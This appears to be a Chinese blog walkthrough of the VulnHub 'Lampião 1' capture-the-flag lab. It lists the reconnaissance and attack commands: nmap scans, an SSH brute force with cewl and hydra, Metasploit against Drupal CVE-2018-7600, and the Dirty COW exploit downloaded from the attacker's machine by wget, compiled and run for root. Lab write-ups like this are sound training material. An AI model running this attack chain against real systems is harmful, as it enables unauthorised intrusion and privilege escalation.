> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ytTSuL5HtdTXET2aGGX5Qg)

靶机地址：https://www.vulnhub.com/entry/lampiao-1,249/  

靶机难度：简单

靶机发布日期：2018 年 7 月 28 日

靶机描述：Would you like to keep hacking in your own lab?

Try this brand new vulnerable machine! "Lampião 1".

目标：得到 root 权限 & 找到 flag.txt

作者：** 大余 **

时间：2019-12-27

请注意：对于所有这些计算机，我已经使用 VMware 运行下载的计算机。我将使用 Kali Linux 作为解决该 CTF 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。

**一、信息收集**

我们在 VM 中需要确定攻击目标的 IP 地址，需要使用 nmap 获取目标 IP 地址：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfj0IpbLWbGqfVvOxYpTh9Kiav3tSZictM0odeKIB9ibibFoNib0stuHwAFf39DSmibQZfkSpFLkRAG60Q/640?wx_fmt=png)

使用命令：nmap -sP 192.168.145.0/24

上一篇 GoldenEye-1 已经简单介绍了 netdiscover 的使用，个人比较喜欢用 nmap，这边就不介绍了。

我们开始探索机器。第一步是找出目标计算机上可用的开放端口和一些服务。因此我在目标计算机上启动了 nmap 全端口扫描：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfj0IpbLWbGqfVvOxYpTh9CpbBeSr2XE1FWmqK48tibDM7gTgRrPk5paicHo90PqLiaFgyHc6jIfDBA/640?wx_fmt=png)

图中可以看出，目标计算机上有三个可用的开放端口 22、80、1898 端口。这里对 22 端口，尝试 ssh 弱口令爆破，并没有结果，这里就不多说 ssh 弱口令爆破了，基本上百度都能搜得到，使用 msf、hydra 等，后期文章攻击也会使用到。

由于目标计算机上的端口 80 可用，我们先来检查下 web 页面。我们在浏览器上打开了目标计算机的 IP，它显示了一个有趣的页面：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfj0IpbLWbGqfVvOxYpTh9AHlicb9Z3wJjk0KQ3MJ4TMdx2Q7Dz3rr16MRPHx558nVcBcOEBe8Dnw/640?wx_fmt=png)

这是一个静态页面，我开始检查主页的 html 内容以获取任何有用的提示（F12 查看），nikto 扫了没什么发现，gobuster、dirb 和御剑扫目录，都没什么发现，半小时过去... 尴尬，并没有什么有用的信息.... 先暂时不管 80 端口了...

还有个 1898 端口开启状态，继续访问获取信息。

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfj0IpbLWbGqfVvOxYpTh98DX4LdIycH6YqaNEDnCcr2ndPhgBU5V73GbpYrsfich4wqI22a8IxcA/640?wx_fmt=png)

可以分别进入两个页面：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfj0IpbLWbGqfVvOxYpTh9eShAP2ydddysMNu6ufb1tCF2v7ic5I9o3zmqcJrXUwNdTXyXOOiaPQmg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfj0IpbLWbGqfVvOxYpTh9Rj3ohI23iabVUgcDniaHiaNrdr4QplMAtrj6WvM1y7M9FsT791X1Im1icw/640?wx_fmt=png)

第一栏点进去内容翻译后并没有什么有效的信息，第二栏点进去细心的我发现了这是 node/3，这是第三栏的内容，说明还有第二栏的内容没有显示，修改下页面试试。

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfj0IpbLWbGqfVvOxYpTh9fdZorC215ytMX0TYd2l3hQNOj5dqaK9bNA6Cu15ibdJia0d3Zar4qxsQ/640?wx_fmt=png)

audio.m4a

qrc.png

经过长时间终于有点有用的信息了... 访问试试

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfj0IpbLWbGqfVvOxYpTh92UtWia7b3Bnf3ibcHIbfVs6UFQibQu1KFrOCXdzhsPYcROpYXwLW8MCdg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfj0IpbLWbGqfVvOxYpTh9u8U4589nCx0A8UcOcxibd2EfNmcbaibQp2KfbrgLBzLKTMleYCic0c5og/640?wx_fmt=png)

这里发现了一段语音和一个二维码，语音内容为：user tiago，则用户名为：tiago

二维码用微信扫描发现为一句话：Try harder！Muahuahua... 并没啥用

这边开始用工具对网站进行爆破扫描...

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfj0IpbLWbGqfVvOxYpTh9biac5khUH4ldULlkYutTYH3UnIztXmZ5vqb9YE5UCVuFJpTibyVUJFZw/640?wx_fmt=png)

找到了一个 robots.txt 文件，后台打开看看

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfj0IpbLWbGqfVvOxYpTh99ujVcTGnL59Coic5eD1IicCmJEnFZa0NO7sBLxhia8FQvowqvgB7cJVhw/640?wx_fmt=png)

这里经过长时间收集信息，在 CHANGELOG.txt 文件，发现网站的版本信息：

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfj0IpbLWbGqfVvOxYpTh92D2OeqAJtrJTP4CFWAw9cVCKzY6J4x0rvJMa3HDvIHOmA7RHzFia9UQ/640?wx_fmt=png)

这是一个基于 Drupal 7 的博客或是社交网站。

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfj0IpbLWbGqfVvOxYpTh9XtkX08jru1fx2nn7pcgb7KaVSyGPQEiaT2x6SmRbNL4ay6VDKISkLQg/640?wx_fmt=png)

这边在页面没什么收获了，开始用工具进行暴力攻击。

cewl：通过爬行网站获取关键信息创建一个密码字典

hydra：神器九头蛇，网上有太多资料

使用命令：cewl http://192.168.145.148:1898/?q=node/1 -w dayu.txt

hydra -l tiago -P dayu.txt 192.168.145.148 ssh

先利用 cewl 来生成一份结合网站目标的社工性质的密码字典、不理解的可以搜索网上搜索 cewl 学习，然后九头蛇暴力破解得到用户密码：

用户: tiago  

密码: Virgulino

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfj0IpbLWbGqfVvOxYpTh9k87Ht1riac8kjvULv1QRpDKR4MiaeNiaqqD6dUMLGRGvUC1rsepLFFdBw/640?wx_fmt=png)

使用用户名 tiago 进行 ssh 登陆连接，成功连接，但是不能用 sudo su 进行提权！！

**二、提权 shell**

我们要针对收集到的信息进行提权。

这边收集到了版本是 2016 年的、Durpal 7。

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfj0IpbLWbGqfVvOxYpTh9nqynCUwIib6DrWicq4HNlYInPzZ4uvlqzAAm44qTiaMbbc3iaAv0zkiahyg/640?wx_fmt=png)

这边搜索到 Drupal 漏洞 CVE-2018-7600，我们尝试使用 MSF 进行渗透试试。

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfj0IpbLWbGqfVvOxYpTh9GPRKOLEicZRHlQhzLy17U6TT8GGaxaF9QrGAQEEFVEibe0R4LebUDNUQ/640?wx_fmt=png)

运行 msfconsole。

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfj0IpbLWbGqfVvOxYpTh9Hy7oBM45WV6TeEWCt3ibBqTQ7RCkXkTtRqr2fS5ABnCth4MUjCFh3uw/640?wx_fmt=png)

这是一种新渗透方法，先查询 durpal 在 MSF 中存在哪些漏洞，我们需要使用的是 2018 年的漏洞，use 选择 4 提取 CVE-2018-7600 漏洞，show option 查询渗透信息，需要填写 Rhosts 攻击 IP，Rport 攻击端口。

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfj0IpbLWbGqfVvOxYpTh9m1NYwicUiabkXB7Qeg8YjL1ibCT9MJUxqXwpOOb4u54esmJnmjU31CJ0A/640?wx_fmt=png)

成功通过漏洞渗透进入系统，获得低权限用户，和前面 ssh 登陆的 tiago 用户权限类似，这是另外一种渗透的方法，可以好好学习。

下一步要找到反弹 shell 获取 root 权限，通过网上对 Durpal 7 版本 2016 年都可以使用 dirty（脏牛）进行提权，非常有名的一个漏洞提权目前已经修复，仅供参考学习。

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfj0IpbLWbGqfVvOxYpTh97wYr5RiaAiacEZRSMxKKo2rO5pcVib9QgUI5OCdR9QwjIfJKyadS12DOQ/640?wx_fmt=png)

命令：searchsploit dirty 查找脏牛提权 shell，利用 40847.cpp

使用 CP 进行复制到本地，cp /usr/share/exploitdb/exploits/linux/local/40847.cpp ~

思路是继续开启本地 pthon 服务，然后把 40847.cp 发送到靶机上。

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfj0IpbLWbGqfVvOxYpTh9ErPxqrbFvCsvEArGkRken16Qia5iaicEhiadprDrPRjvddL2R2ev7j8JicQ/640?wx_fmt=png)

命令：python -m SimpleHTTPServer 5555   开启服务

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfj0IpbLWbGqfVvOxYpTh9c9n5q86ZzFjDfkUPoicqUHX7sjqI0WhNJJkbceWiaCXAIlnicfRibibvvhg/640?wx_fmt=png)

命令：wget http://192.168.182.135:5555/40847.cpp

将 40847.cp 上传到靶机上。

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfj0IpbLWbGqfVvOxYpTh97JE67qBy6yaPJ3XbZCkTaVQe6ymebTho03JocAYFJnX0Y0YXL7Um0g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfj0IpbLWbGqfVvOxYpTh96WjTpNaInPGGZoOw1vEMjbQ1a8icTicicicicfunoZD0omKficRVBfibSt9XQ/640?wx_fmt=png)

命令：g++ -Wall -pedantic -O2 -std=c++11 -pthread -o 40847 40847.cpp -lutil

1. -Wall 一般使用该选项，允许发出 GCC 能够提供的所有有用的警告

2. -pedantic 允许发出 ANSI/ISO C 标准所列出的所有警告

3. -O2 编译器的优化选项的 4 个级别，-O0 表示没有优化,-O1 为缺省值，-O3 优化级别最高

4. -std=c++11 就是用按 C++2011 标准来编译的

5. -pthread 在 Linux 中要用到多线程时，需要链接 pthread 库

6. -o dcow gcc 生成的目标文件, 名字为 dcow

执行 gcc 编译可执行文件，可直接提权。

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfj0IpbLWbGqfVvOxYpTh9DLYWhDuN8yZEAxkibzHK26GdrfGQXFty2DE88SbOJdZSmZceuNaSJ8w/640?wx_fmt=png)

这个靶场还是学到了很多的东西，比如说如何一步一步进行渗透，

虽说与真实的环境相差甚远，但是最主要了还是用来锻炼自己的能力，

在本篇的实验中还是存在很多的不足的！还是要靠百度来进行一步一步的探索

主要还是自己的知识面太窄了，比如说这个脏牛提权，百度才知道...

看来以后还是要多扩大自己的知识面，前面的都还行，遇上一个实验差不多，

到了提权这一步就开始花里胡哨，自己就很懵比，就很难受！！！！

还是要多学习！！

由于我们已经成功得到 root 权限 & 找到 flag.txt，因此完成了简单靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。

如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfj0IpbLWbGqfVvOxYpTh9X7fkCq2IrE9gfRibnJcIrJdt4jqqBzE7fETAt04KwnUicTHzevo68RUA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KNfj0IpbLWbGqfVvOxYpTh9Qlx9vpFoppCaw3zarZ1M4A25Qo47O3dfA5T3O8QVlmMMniaVTFZTO3w/640?wx_fmt=png)